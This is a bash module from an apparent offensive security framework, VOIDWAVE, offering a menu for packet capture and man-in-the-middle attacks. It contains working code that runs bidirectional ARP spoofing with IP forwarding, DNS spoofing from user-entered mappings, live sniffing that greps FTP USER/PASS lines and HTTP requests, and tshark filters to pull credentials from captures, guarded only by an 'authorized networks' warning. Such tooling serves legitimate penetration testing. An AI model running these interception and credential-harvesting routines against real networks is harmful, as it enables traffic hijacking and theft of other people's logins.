#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at:
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# See LICENSE and NOTICE files in the project root for full details.
# ═══════════════════════════════════════════════════════════════════════════════
#
# Traffic Menu: packet capture, MITM attacks, PCAP analysis
# ═══════════════════════════════════════════════════════════════════════════════

[[ -n "${_VOIDWAVE_TRAFFIC_MENU_LOADED:-}" ]] && return 0
declare -r _VOIDWAVE_TRAFFIC_MENU_LOADED=1

show_traffic_menu() {
    [[ "${VW_NON_INTERACTIVE:-0}" == "1" ]] && return 1

    while true; do
        clear_screen 2>/dev/null || clear
        show_banner "${VERSION:-}"

        echo -e "    ${C_BOLD:-}Traffic Analysis${C_RESET:-}"
        echo ""
        echo "    1) Packet Capture (tcpdump)"
        echo "    2) Wireshark (GUI)"
        echo "    3) ARP Spoofing"
        echo "    4) DNS Spoofing"
        echo "    5) Network Sniffing"
        echo "    6) PCAP Analysis"
        echo "    0) Back"
        echo ""

        local choice
        echo -en "    ${C_PURPLE:-}▶${C_RESET:-} Select [0-6]: "
        read -r choice
        choice="${choice//[[:space:]]/}"

        case "$choice" in
            1) _traffic_tcpdump ;;
            2) _traffic_wireshark ;;
            3) _traffic_arpspoof ;;
            4) _traffic_dnsspoof ;;
            5) _traffic_sniff ;;
            6) _traffic_pcap ;;
            0) return 0 ;;
            "") continue ;;
            *) echo -e "    ${C_RED:-}[!] Invalid option: '$choice'${C_RESET:-}"; sleep 1 ;;
        esac
    done
}

_traffic_tcpdump() {
    echo ""

    if ! command -v tcpdump &>/dev/null; then
        echo -e "    ${C_RED:-}tcpdump not found${C_RESET:-}"
        echo "    Install: apt install tcpdump"
        wait_for_keypress
        return 1
    fi

    if [[ $EUID -ne 0 ]]; then
        echo -e "    ${C_RED:-}Packet capture requires root${C_RESET:-}"
        wait_for_keypress
        return 1
    fi

    local iface filter duration

    iface=$(select_interface) || { wait_for_keypress; return; }

    echo ""
    echo "    1) All traffic"
    echo "    2) HTTP only (port 80/443)"
    echo "    3) DNS only (port 53)"
    echo "    4) SSH only (port 22)"
    echo "    5) Custom BPF filter"
    echo ""

    local filter_choice
    read -rp "    Filter [1-5]: " filter_choice

    case "$filter_choice" in
        1) filter="" ;;
        2) filter="tcp port 80 or tcp port 443" ;;
        3) filter="udp port 53" ;;
        4) filter="tcp port 22" ;;
        5) read -rp "    BPF filter: " filter ;;
        *) return ;;
    esac

    read -rp "    Duration seconds (0=until Ctrl+C) [60]: " duration
    duration="${duration:-60}"

    local outdir="${VOIDWAVE_OUTPUT_DIR:-$HOME/.voidwave/output}/captures"
    mkdir -p "$outdir"
    local outfile="$outdir/tcpdump_$(date +%Y%m%d_%H%M%S).pcap"

    echo ""
    echo -e "    ${C_CYAN:-}Capturing on $iface${C_RESET:-}"
    echo -e "    ${C_GRAY:-}Output: $outfile${C_RESET:-}"
    [[ -n "$filter" ]] && echo -e "    ${C_GRAY:-}Filter: $filter${C_RESET:-}"
    echo -e "    ${C_YELLOW:-}Press Ctrl+C to stop${C_RESET:-}"
    echo ""

    if [[ "$duration" == "0" ]]; then
        # shellcheck disable=SC2086
        tcpdump -i "$iface" -w "$outfile" $filter 2>&1 | sed 's/^/    /' || true
    else
        # shellcheck disable=SC2086
        timeout "$duration" tcpdump -i "$iface" -w "$outfile" $filter 2>&1 | sed 's/^/    /' || true
    fi

    [[ -f "$outfile" ]] && echo -e "    ${C_GREEN:-}Saved: $outfile${C_RESET:-}"

    wait_for_keypress
}

_traffic_wireshark() {
    echo ""

    if ! command -v wireshark &>/dev/null; then
        echo -e "    ${C_RED:-}wireshark not found${C_RESET:-}"
        echo "    Install: apt install wireshark"
        wait_for_keypress
        return 1
    fi

    echo -e "    ${C_CYAN:-}Launching Wireshark${C_RESET:-}"

    wireshark &>/dev/null &
    disown

    echo -e "    ${C_GREEN:-}Wireshark started${C_RESET:-}"

    wait_for_keypress
}

_traffic_arpspoof() {
    echo ""

    if [[ $EUID -ne 0 ]]; then
        echo -e "    ${C_RED:-}ARP spoofing requires root${C_RESET:-}"
        wait_for_keypress
        return 1
    fi

    if ! command -v arpspoof &>/dev/null; then
        echo -e "    ${C_RED:-}arpspoof not found${C_RESET:-}"
        echo "    Install: apt install dsniff"
        wait_for_keypress
        return 1
    fi

    echo -e "    ${C_YELLOW:-}Warning: Only use on authorized networks${C_RESET:-}"
    echo ""

    confirm "Continue?" || return

    local iface gateway target

    iface=$(select_interface) || { wait_for_keypress; return; }

    local default_gw
    default_gw=$(get_default_gateway)

    read -rp "    Gateway IP [$default_gw]: " gateway
    gateway="${gateway:-$default_gw}"

    read -rp "    Target IP: " target
    [[ -z "$target" ]] && return

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    echo ""
    echo -e "    ${C_CYAN:-}ARP spoofing: $target <-> $gateway${C_RESET:-}"
    echo -e "    ${C_YELLOW:-}Press Ctrl+C to stop${C_RESET:-}"
    echo ""

    # Run bidirectional spoof
    arpspoof -i "$iface" -t "$target" "$gateway" 2>&1 | sed 's/^/    /' &
    local pid1=$!
    arpspoof -i "$iface" -t "$gateway" "$target" 2>&1 | sed 's/^/    /' &
    local pid2=$!

    trap "kill $pid1 $pid2 2>/dev/null; echo 0 > /proc/sys/net/ipv4/ip_forward" INT
    wait $pid1 $pid2 2>/dev/null
    trap - INT

    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward

    echo ""
    echo -e "    ${C_GREEN:-}ARP spoofing stopped${C_RESET:-}"

    wait_for_keypress
}

_traffic_dnsspoof() {
    echo ""

    if [[ $EUID -ne 0 ]]; then
        echo -e "    ${C_RED:-}DNS spoofing requires root${C_RESET:-}"
        wait_for_keypress
        return 1
    fi

    if ! command -v dnsspoof &>/dev/null; then
        echo -e "    ${C_RED:-}dnsspoof not found${C_RESET:-}"
        echo "    Install: apt install dsniff"
        wait_for_keypress
        return 1
    fi

    echo -e "    ${C_YELLOW:-}Warning: Only use on authorized networks${C_RESET:-}"
    echo ""

    confirm "Continue?" || return

    local iface hostsfile

    iface=$(select_interface) || { wait_for_keypress; return; }

    # Create hosts file
    local tmpdir="${VOIDWAVE_OUTPUT_DIR:-$HOME/.voidwave/output}/tmp"
    mkdir -p "$tmpdir"
    hostsfile="$tmpdir/dnsspoof_hosts.txt"

    echo ""
    echo -e "    ${C_CYAN:-}Enter DNS mappings (blank line to finish):${C_RESET:-}"
    echo -e "    ${C_GRAY:-}Format: IP DOMAIN (e.g., 192.168.1.100 *.example.com)${C_RESET:-}"
    echo ""

    > "$hostsfile"
    while true; do
        local entry
        read -rp "    > " entry
        [[ -z "$entry" ]] && break
        echo "$entry" >> "$hostsfile"
    done

    if [[ ! -s "$hostsfile" ]]; then
        echo -e "    ${C_YELLOW:-}No entries, cancelled${C_RESET:-}"
        wait_for_keypress
        return
    fi

    echo ""
    echo -e "    ${C_CYAN:-}Starting DNS spoofing${C_RESET:-}"
    echo -e "    ${C_YELLOW:-}Press Ctrl+C to stop${C_RESET:-}"
    echo ""

    dnsspoof -i "$iface" -f "$hostsfile" 2>&1 | sed 's/^/    /' || true

    rm -f "$hostsfile"

    wait_for_keypress
}

_traffic_sniff() {
    echo ""

    if [[ $EUID -ne 0 ]]; then
        echo -e "    ${C_RED:-}Sniffing requires root${C_RESET:-}"
        wait_for_keypress
        return 1
    fi

    if ! command -v tcpdump &>/dev/null; then
        echo -e "    ${C_RED:-}tcpdump not found${C_RESET:-}"
        wait_for_keypress
        return 1
    fi

    local iface
    iface=$(select_interface) || { wait_for_keypress; return; }

    echo ""
    echo "    1) HTTP URLs"
    echo "    2) FTP credentials"
    echo "    3) DNS queries"
    echo "    4) All cleartext"
    echo ""

    local mode
    read -rp "    Sniff mode [1-4]: " mode

    echo ""
    echo -e "    ${C_CYAN:-}Sniffing on $iface${C_RESET:-}"
    echo -e "    ${C_YELLOW:-}Press Ctrl+C to stop${C_RESET:-}"
    echo ""

    case "$mode" in
        1)
            tcpdump -i "$iface" -A -s0 'tcp port 80' 2>/dev/null | grep -E "^(GET|POST|Host:)" | sed 's/^/    /' || true
            ;;
        2)
            tcpdump -i "$iface" -A -s0 'tcp port 21' 2>/dev/null | grep -Ei "(USER|PASS)" | sed 's/^/    /' || true
            ;;
        3)
            tcpdump -i "$iface" -n 'udp port 53' 2>/dev/null | sed 's/^/    /' || true
            ;;
        4)
            tcpdump -i "$iface" -A -s0 'tcp port 21 or tcp port 23 or tcp port 80 or tcp port 110 or tcp port 143' 2>/dev/null | sed 's/^/    /' || true
            ;;
        *) return ;;
    esac

    wait_for_keypress
}

_traffic_pcap() {
    echo ""

    local pcapfile
    read -rp "    PCAP file path: " pcapfile
    [[ -z "$pcapfile" || ! -f "$pcapfile" ]] && { echo -e "    ${C_RED:-}File not found${C_RESET:-}"; wait_for_keypress; return; }

    echo ""
    echo "    1) Summary statistics"
    echo "    2) HTTP requests"
    echo "    3) DNS queries"
    echo "    4) Extract credentials"
    echo "    5) Conversation list"
    echo "    6) Open in Wireshark"
    echo ""

    local mode
    read -rp "    Analysis [1-6]: " mode

    echo ""

    case "$mode" in
        1)
            if command -v capinfos &>/dev/null; then
                capinfos "$pcapfile" 2>&1 | sed 's/^/    /'
            elif command -v tcpdump &>/dev/null; then
                tcpdump -r "$pcapfile" -q 2>&1 | tail -20 | sed 's/^/    /'
            fi
            ;;
        2)
            if command -v tshark &>/dev/null; then
                tshark -r "$pcapfile" -Y "http.request" -T fields -e http.host -e http.request.uri 2>/dev/null | head -50 | sed 's/^/    /'
            else
                tcpdump -r "$pcapfile" -A 2>/dev/null | grep -E "^(GET|POST|Host:)" | head -50 | sed 's/^/    /'
            fi
            ;;
        3)
            if command -v tshark &>/dev/null; then
                tshark -r "$pcapfile" -Y "dns.qry.name" -T fields -e dns.qry.name 2>/dev/null | sort -u | head -50 | sed 's/^/    /'
            else
                tcpdump -r "$pcapfile" -n 'udp port 53' 2>/dev/null | head -50 | sed 's/^/    /'
            fi
            ;;
        4)
            echo -e "    ${C_CYAN:-}Searching for credentials...${C_RESET:-}"
            if command -v tshark &>/dev/null; then
                tshark -r "$pcapfile" -Y "ftp.request.command == USER or ftp.request.command == PASS or http.authbasic" 2>/dev/null | sed 's/^/    /'
            else
                tcpdump -r "$pcapfile" -A 2>/dev/null | grep -Ei "(user|pass|login|auth)" | head -30 | sed 's/^/    /'
            fi
            ;;
        5)
            if command -v tshark &>/dev/null; then
                tshark -r "$pcapfile" -q -z conv,tcp 2>/dev/null | head -30 | sed 's/^/    /'
            fi
            ;;
        6)
            if command -v wireshark &>/dev/null; then
                wireshark "$pcapfile" &>/dev/null &
                disown
                echo -e "    ${C_GREEN:-}Opened in Wireshark${C_RESET:-}"
            else
                echo -e "    ${C_RED:-}Wireshark not found${C_RESET:-}"
            fi
            ;;
        *) return ;;
    esac

    wait_for_keypress
}

# ═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
# ═══════════════════════════════════════════════════════════════════════════════

export -f show_traffic_menu
export -f _traffic_tcpdump _traffic_wireshark _traffic_arpspoof
export -f _traffic_dnsspoof _traffic_sniff _traffic_pcap
